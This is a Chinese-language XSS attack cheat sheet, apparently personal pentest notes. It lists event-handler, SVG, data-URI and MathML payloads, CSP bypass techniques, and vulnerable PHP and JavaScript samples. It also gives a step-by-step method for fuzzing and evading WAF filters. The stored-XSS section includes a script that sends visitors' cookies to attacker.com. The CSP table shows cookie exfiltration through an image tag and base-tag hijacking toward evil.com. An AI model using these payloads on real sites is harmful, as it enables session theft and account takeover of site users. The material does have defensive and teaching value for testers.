### js常用标签



**script标签**

```
<script>
// 内嵌JS代码
alert(1)
</script>

<script src="https://xxx/xxx.js"></script> <!-- 外部引入 -->
```

关键属性（XSS 常用）

- `src`：远程加载 JS
- `type="text/javascript"` / `module`：脚本类型
- `onerror`：加载失败触发（XSS 打 cdn、外域资源很常用）



**不一定要script标签，很多标签的事件属性、伪协议、SVG 等都能执行 JS**

分类：事件型、伪协议、SVG、特殊冷门标签



**事件属性类**（最常用，过滤 script 时首选）

几乎大部分 HTML 标签都支持 on 事件，只要可控参数能写属性值就能打

```
<!-- 最简 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input type=image src=x onerror=alert(1)>
<iframe src=x onload=alert(1)>
```

高频事件：`onclick/onerror/onload/onmouseover/onmouseout/onfocus/onblur`



**a 标签伪协议 javascript:（老牌经典）**(出现重定向时,可以考虑使用)

```
<a href="javascript:alert(1)">click</a>
```

> 特点：**需要用户点击才触发**，属于**主动型 XSS**，不是自动弹；很多现代浏览器对 a 标签 javascript 协议有限制、CSP 也会拦



**SVG 系列（绕过 script 标签过滤神器，经常 WAF 漏）**

```
<!-- 自动执行 -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<!-- SVG内嵌CDATA绕过过滤 -->
<svg><script>//<![CDATA[alert(1)//]]></script></svg>
```



**iframe /frame 相关**

```
<iframe src="javascript:alert(1)"></iframe>
```

> 很多浏览器现在直接拦截 iframe 的`javascript:`伪协议，成功率下降



**冷门但好用的标签（绕过关键词过滤）**

```
<video onloadedmetadata=alert(1)>
<audio onloadeddata=alert(1)>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
```



**MathML（少数浏览器支持，偏小众绕过）**

```
<math><maction xlink:href="javascript:alert(1)">123</maction></math>
```



**Data伪协议**：直接嵌入HTML代码(用来**绕过 WAF / 过滤javascript:**)

```
data:text/html,<script>alert(1)</script>
```

iframe src 里放（最经典，自动执行，不用点击）

```
<iframe src="data:text/html,<script>alert(1)</script>">
```

 a 标签 href 里放（需要用户点击才触发）

```
<a href="data:text/html,<script>alert(1)</script>">click</a>
```

### 经典 CSP bypass招式

 核心指令速查:

| 指令                     | 作用                                                         | 攻击面/常见失误                                              |
| :----------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| `default-src`            | 所有资源默认策略（兜底）                                     | 只写`default-src 'self'`看着安全。如果写了`script-src`，script 就**不再使用 default-src**；没写的资源类型，全部回退到 default-src。 |
| `script-src`             | **控制 JS 脚本来源**（核心指令），控制`<script>`、事件处理器 on*、eval 等 | 高危坑：1. 带上`'unsafe-inline'`= 允许 onerror/onclick 这类内联事件2. `'unsafe-eval'`允许 eval、new Function3. 白名单写的域名太宽泛（比如`*.xxx.com`），子域有 JSONP / 上传 JS 就可以 bypass |
| `'unsafe-inline'`        | 允许内联脚本/事件                                            | 等同没 CSP，注入即执行                                       |
| `'unsafe-eval'`          | 允许 eval/Function                                           | DOM 型链路随便跑                                             |
| `'nonce-xxx'`            | 只有带对应`nonce="xxx"`属性的`<script>`标签，才允许执行内联 JSnonce 是服务端每次页面生成的随机值 | 漏洞场景：nonce 可预测、固定不变、或者前端 DOM 能读到 nonce 值，攻击者拿到 nonce 就可以注入`<script nonce="xxx">alert(1)</script>` |
| `'strict-dynamic'`       | 信任**被可信脚本动态加载出来**的脚本不需要再手动写一堆域名白名单 | 找白名单内的 gadget（小工具），典型就是 JSONP、Angular 这类框架漏洞。只要加载一个可信脚本，这个脚本引入的其他 JS 都放行 |
| `script-src-attr         | CSP3 新指令：**单独控制 onclick/onerror 这类内联事件处理器**和 script-src 分开 | CSP3 新指令，老策略未覆盖事件处理器                          |
| `base-uri`               | 限制页面`<base href="xxx">`标签                              | 如果**没设置 base-uri**，注入`<base href="https://evil.com/">`。页面上所有**相对路径 js/css**都会变成从[evil.com](https://evil.com)加载，劫持资源 |
| `object-src`             | 限制`<object> / <embed> / <applet>`插件资源（flash 等）      | 没写这条指令，默认继承 default-src；如果 default-src 宽松，就可以用 object 加载恶意资源。**最佳实践：object-src 'none'** |
| `frame-ancestors`        | 控制**谁可以 iframe 嵌入当前页面**，用来防点击劫持           | 不设置，就可以被别人 iframe 嵌套页面实施点击劫持。注意：和 X-Frame-Options 功能类似；frame-ancestors 优先级更高 |
| `img-src / connect-src`  | img-src：图片来源；connect-src：fetch、ajax 请求目标         | 放开`img-src *`，是**CSP 外带 Cookie 最常用通道**。XSS 拿到 cookie 后，用`<img src=https://xxx/steal?cookie=xxxx>`发送数据到攻击者服务器。connect-src 控制 ajax 请求外带 |
| `report-uri / report-to` | 违规上报                                                     | 仅 Report-Only 模式不拦截，纯观察                            |

1. 优先看 script-src，这是 XSS 能否执行的关键 
   - 有`'unsafe-inline'` → 旧 payload（onerror、svg onload）直接能用
   - 有`'unsafe-eval'` → eval 类 DOM XSS 可执行
   - 白名单域名过多 / 泛域名 → 找 JSONP、文件上传做 bypass
2. 看有没有`nonce`：nonce 随机才安全；固定 nonce = 可绕过
3. 看`base-uri`是否缺失：可以 base 标签劫持相对资源
4. 看`object-src`，最好是`'none'`，没写就存在风险

### XSS漏洞的分类与特性

根据恶意脚本的存储方式和执行流程，XSS可分为三类

![1786651562565](/assets/xss/1786651562565.png)



#### 反射型XSS

需通过URL参数传递恶意脚本，经后端输出后执行，例如：

```
http://example.com/1.php?a=<script>alert(1)</script>
```

特点是攻击链路依赖“用户点击恶意链接”，单次请求生效。

源码

```
<?php
// 获取GET参数a，无任何过滤直接输出
$a = $_GET['a'];
echo $a;
?>
```



#### DOM型XSS

完全由前端JS解析执行，例如页面中存在以下代码：

```
<!DOCTYPE html>
<html>
<body>
<script>
var action = location.href.split('action=')[1];
document.write(action);
</script>
</body>
</html>
```

攻击者构造URL：

```
http://example.com/a.php?action=<script>alert(1)</script>
```

此时恶意脚本会被document.write直接渲染执行，无需后端参与。

#### 存储型XSS

危害最大的XSS类型：攻击者将恶意脚本提交至服务器（如评论区），存储在数据库中。每当其他用户访问该评论页，脚本便会被加载执行。例如论坛评论中注入：

```
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
#这里就是用来带着 Cookie 数据访问黑客的接收脚本
```

所有查看该评论的用户，Cookie都会被窃取。



存储型xss常结合文件上传

可以通过文件上传修改content-type来绕过waf

```
text/html：html 网页类型，很多站点允许上传 html 文件类型 MIME
text/xml：普通 xml 文本
image/svg+xml：svg 矢量图片 MIME，svg 本身是 xml 格式，可以写 XSS；很多网站允许图片上传，这个很常用
text/xsl：xsl 样式表，xml 的样式文件
application/xml：应用类型 xml
```

### 浏览器解析顺序与编码解码机制（核心内功）

绕过过滤的本质是**利用解析顺序差**：过滤器在服务器端按字符串规则匹配，而浏览器在客户端按 HTML → URL → JavaScript 的顺序层层解码。理解解码链条，才能预判一个变形 Payload 最终会变成什么。



浏览器解码顺序:

1. 第 1 层：HTML 解析器

   先进行 HTML 实体解码（`&lt;`→`<`、`&#x3c;`→`<`、`&#60;`→`<`），构建 DOM 树。标签、属性在这一层定型。

2. 第 2 层：URL 解析器

   当属性值是 URL（href/src/action）且被导航/加载时，进行 URL 解码（`%3c`→`<`）。`javascript:` 伪协议内的内容会被当 JS 执行。

3. 第 3 层：JavaScript 解析器

   执行 JS 时进行 JS 转义解码：`\x3c` `\u003c` `\74`（八进制，字符串中）、`\c` 等。

**黄金规则：HTML 实体解码先于 JS 执行。**在 `<a href="&#106;avascript:alert(1)">` 中，HTML 层先把 `&#106;` 解码成 `j`，于是 URL 层看到 `javascript:alert(1)` 并执行——这就是实体编码绕过的原理。反过来，在 `<script>` 标签内部，HTML 实体**不会**被解码（script 是 CDATA 区域），`&lt;` 在 script 里就是字面量。

| 编码类型           | 写法                       | 解码时机                   | 绕过场景                 |
| :----------------- | :------------------------- | :------------------------- | :----------------------- |
| HTML 十进制实体    | `&#60;`                    | HTML 解析（属性值/文本）   | 过滤 `<` 时塞属性/文本   |
| HTML 十六进制实体  | `&#x3c;` / `&#x3C;`        | 同上（大小写混合再混编码） | 黑名单正则头疼组合       |
| HTML 命名实体      | `&lt;` `&Tab;` `&NewLine;` | HTML 解析                  | `&Tab;` 可拆分关键词     |
| URL 编码           | `%3c` / `%3C`              | 进入服务器前 / URL 上下文  | 过 WAF、双重编码 `%253c` |
| Unicode 转义（JS） | `\\u003c`                  | JS 字符串/标识符解析       | JS 上下文内变形          |
| 十六进制转义（JS） | `\\x3c`                    | JS 字符串解析              | 构造 alert 关键字变形    |
| 八进制转义（JS）   | `\\74`（=t）               | JS 字符串解析              | 冷门但有效               |
| Base64             | `atob('YWxlcnQoMSk=')`     | JS 运行时                  | 关键字全隐藏             |

### 输出上下文对应利用方式

六大上下文对照表

| 输出上下文     | 回显形态               | 原理 & 突破思路                                              | 示例 Payload                                                 |
| -------------- | ---------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| ① HTML 正文    | `<div>[IN]</div>`      | 输入直接放在标签之间，没有被引号包裹。不需要闭合引号，**直接注入新 HTML 标签**，带事件触发 JS。 | `<svg onload=alert(1)>`svg 的 onload 在标签加载完成自动执行 JS |
| ② 双引号属性   | `<input value="[IN]">` | 输入被包在`"`双引号里面。思路：**先闭合双引号，新增事件属性**，最后可以加注释把剩下引号吃掉。 | `" onfocus=alert(1) autofocus "`解析后：`<input value="" onfocus=alert(1) autofocus "">` |

JS 上下文的进阶闭合

回显模板：`var q = "[IN]";` ，可控输入放在 JS 双引号字符串里面，多种思路：

```
// 场景：var q = "[IN]";

// 渲染结果：var q = "";alert(1);//";
// 解释：" 闭合原有字符串；; 结束当前语句；alert(1)新代码；//注释掉后面多余引号

`${alert(1)}`

```







### 手工 Fuzz XSS思路

第一步，先打无害探针 `xss"'<>test${7*7}`

这是**万能初筛探针，不带攻击逻辑，只做探测，不会直接触发弹窗**。

- 字符拆解含义： 
  - `xss`：标记，方便你在返回页面快速找到你的输入位置
  - `"` 双引号：测试能不能跳出 HTML 属性双引号上下文
  - `'` 单引号：测试能不能跳出单引号属性上下文
  - `< >`：最关键，HTML 标签起始、结束符，判断是否 HTML 转义
  - `${7*7}`：**JS 模板字符串探测**，如果落在 JS 上下文，`${7*7}`会被解析算出 49；如果是普通 HTML 文本，原样显示 `${7*7}`
  - `test`：占位文本

F12 看回显（Elements 面板）:

1. **哪些字符原样保留**：比如 `<` 没有变成 `&lt;` → 代表 HTML 实体没转义，高危信号

2. 哪些被处理

   ： 

   - 变成 HTML 实体（`&lt;`）：HTML 转义，正文里基本堵死 XSS
   - 直接被删除 / 过滤：WAF 或后端黑名单直接吃掉这个字符
   - 加了转义符 `\`：落在 JS 字符串上下文（`\'` `\"`）

3. 落在哪个上下文

   （重中之重） 

   - 页面**正文文本节点**：输入直接在标签之间
   - **HTML 属性内**：`<input value="你的输入">`
   - **JS 块内**：`<script>var a="你的输入"</script>`
   - URL / CSS / HTML 注释内



第二步:字符表测试,逐个测试特殊字符

| 字符          | 探测目的                                                     |
| ------------- | ------------------------------------------------------------ |
| `<`           | 能不能开启新标签（XSS 最核心字符，`<`没了基本很难 HTML 注入） |
| `>`           | 闭合标签                                                     |
| `"`/`'`       | 跳出属性引号                                                 |
| `/`           | 闭合标签，`<img/>`，也用于协议`javascript:`                  |
| `=`           | 属性赋值：`onclick=alert()` 必须要有`=`                      |
| `(` `)`       | 函数调用，alert (1) 括号                                     |
| `;`           | JS 语句分隔符                                                |
| ```           | 反引号，JS 模板字符串                                        |
| 空格          | 分隔标签属性；如果空格被过滤，后面就用`&Tab;` `&NewLine;`替代 |
| `javascript:` | 伪协议探测（`href=javascript:alert()`）                      |
| `on*`         | 事件处理器前缀：onclick、onerror、onload、onfocus 这类       |



第三步:上下文确认,判断输入所处的上下文，选闭合方式

这是 XSS 手工 Fuzz**最核心的一步**

1. **HTML 正文（文本节点）** 

   输入在两个标签中间：`<div>【你的输入】</div>` 闭合思路：直接新建标签，如`<svg onload=xxx>`，不需要引号闭合

2. HTML 属性上下文（最常见）

    例：

   ```
   <input value="【你的输入】">
   ```

    闭合思路：用 " 跳出属性，

   ```
   "onclick=alert(1)//
   ```

   > payload 作用：`"` 把原有 value 引号闭合，新增 onclick 事件，`//`注释掉后面剩下的引号

3. **JS 上下文（script 标签内）**

    `<script>let x = "【你的输入】"</script>` 闭合思路：用`"`或者`'`跳出 JS 字符串，`;`截断语句；这里要区分是后端转义`\"`，还是 HTML 实体

4. **URL 上下文** 

   输入放在`href/src`属性，需要伪协议`javascript:`，同时注意 URL 编码规则

5. **CSS 上下文 / 注释上下文** 

   CSS：expression（老浏览器）；注释：输入落在`<!-- 输入 -->`，需要先闭合注释`-->`



第四步:最小可用 Payload

原则：**能少字符就少字符，去掉多余东西，降低被 WAF 识别概率**。

推荐优先两个最小 payload：

```
<svg onload=alert(1)>#正文上下文首选
```

```
" onfocus=alert(1) autofocus="#属性上下文首选，免用户交互
```



第五步:被拦截时，逐项替换尝试

当最小 payload 被 WAF/CSP 拦截，按下面顺序依次尝试绕过，不要乱试：

1. **编码**：HTML 实体编码、URL 编码、Unicode 编码（`&#x3C;`、`&Tab;`）

2. 拆分关键词：用`&Tab;` / `&NewLine;` 替换空格，标签属性之间用换行、tab 分隔，绕开空格匹配的 WAF 

   ```
   <svg&Tab;onload=alert(1)>
   ```

3. **换事件**：onerror、onload、onfocus、onpageshow、onmouseover，这个事件被拦就换另一个

4. **换协议**：`javascript:`不行试 `vbscript:`（旧 IE）、`data:`协议

5. **换上下文**：如果属性注入被拦，尝试闭合标签，把注入点切到 HTML 正文上下文

> 注意：CSP 不属于 WAF 过滤，CSP 是浏览器层面。就算你成功注入标签，如果 CSP 没有`unsafe-inline`，事件依然执行不了，这种情况**WAF 没拦，浏览器拦了**，不算可利用 XSS。
